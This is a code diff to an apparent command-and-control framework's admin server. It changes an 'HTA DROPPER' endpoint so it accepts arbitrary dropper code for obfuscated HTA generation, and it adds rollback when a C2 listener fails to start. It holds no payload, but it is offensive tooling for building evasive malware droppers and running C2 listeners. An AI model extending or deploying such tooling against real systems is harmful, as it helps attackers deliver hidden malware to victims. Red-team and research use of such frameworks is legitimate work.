@@ -539,21 +539,18 @@ class AdminServer:
         username = self.auth_manager.get_current_user()
         try:
             data = request.get_json()
-            if not data or 'oneliner' not in data:
-                self.logger.log_event(f"HTA DROPPER - Missing oneliner for user {username}")
-                return jsonify({"error": "Missing oneliner parameter"}), 400
-            oneliner = data['oneliner'].strip()
+            if not data or 'dropper_code' not in data:
+                self.logger.log_event(f"HTA DROPPER - Missing dropper_code for user {username}")
+                return jsonify({"error": "Missing dropper_code parameter"}), 400
+            dropper_code = data['dropper_code'].strip()
             obfuscation_level = data.get('obfuscation_level', 5)
             obfuscation_level = max(1, min(10, int(obfuscation_level)))
-            if not oneliner:
-                self.logger.log_event(f"HTA DROPPER - Empty oneliner for user {username}")
-                return jsonify({"error": "Oneliner cannot be empty"}), 400
-            if not oneliner.startswith('powershell.exe'):
-                self.logger.log_event(f"HTA DROPPER - Invalid oneliner format for user {username}")
-                return jsonify({"error": "Invalid oneliner format"}), 400
+            if not dropper_code:
+                self.logger.log_event(f"HTA DROPPER - Empty dropper_code for user {username}")
+                return jsonify({"error": "Dropper code cannot be empty"}), 400
             from utils.hta_obfuscator import AdvancedHTAObfuscator
             obfuscator = AdvancedHTAObfuscator(obfuscation_level)
-            hta_content = obfuscator.generate_obfuscated_hta_from_oneliner(oneliner)
+            hta_content = obfuscator.generate_obfuscated_hta(dropper_code)
             if not hta_content:
                 self.logger.log_event(f"HTA DROPPER - Generation failed for user {username}")
                 return jsonify({"error": "Error generating obfuscated HTA"}), 500
@@ -664,14 +661,21 @@ class AdminServer:
             self.db.create_listener(listener_data)
 
             # Start the C2 server thread immediately
-            started = False
             if self.listener_manager:
                 try:
                     listener_config = build_listener_config(listener_data, self.config_loader)
                     listener_config['profile'] = profile
-                    started = self.listener_manager.start_listener(listener_config)
+                    started, start_err = self.listener_manager.start_listener(listener_config)
                 except Exception as e:
-                    self.logger.log_event(f"LISTENER - Could not start after create: {e}")
+                    started, start_err = False, str(e)
+
+                if not started:
+                    # Rollback: remove the listener from DB so the user can fix and retry
+                    self.db.delete_listener(listener_id)
+                    self.logger.log_event(
+                        f"LISTENER - '{username}' failed to start listener '{name}' on port {bind_port}: {start_err}"
+                    )
+                    return jsonify({"error": start_err}), 400
 
             self.logger.log_event(
                 f"LISTENER - '{username}' created listener '{name}' "
@@ -680,7 +684,7 @@ class AdminServer:
 
             return jsonify({
                 "success": True,
-                "listener": {**listener_data, "running": started}
+                "listener": {**listener_data, "running": True}
             }), 201
 
         except Exception as e:
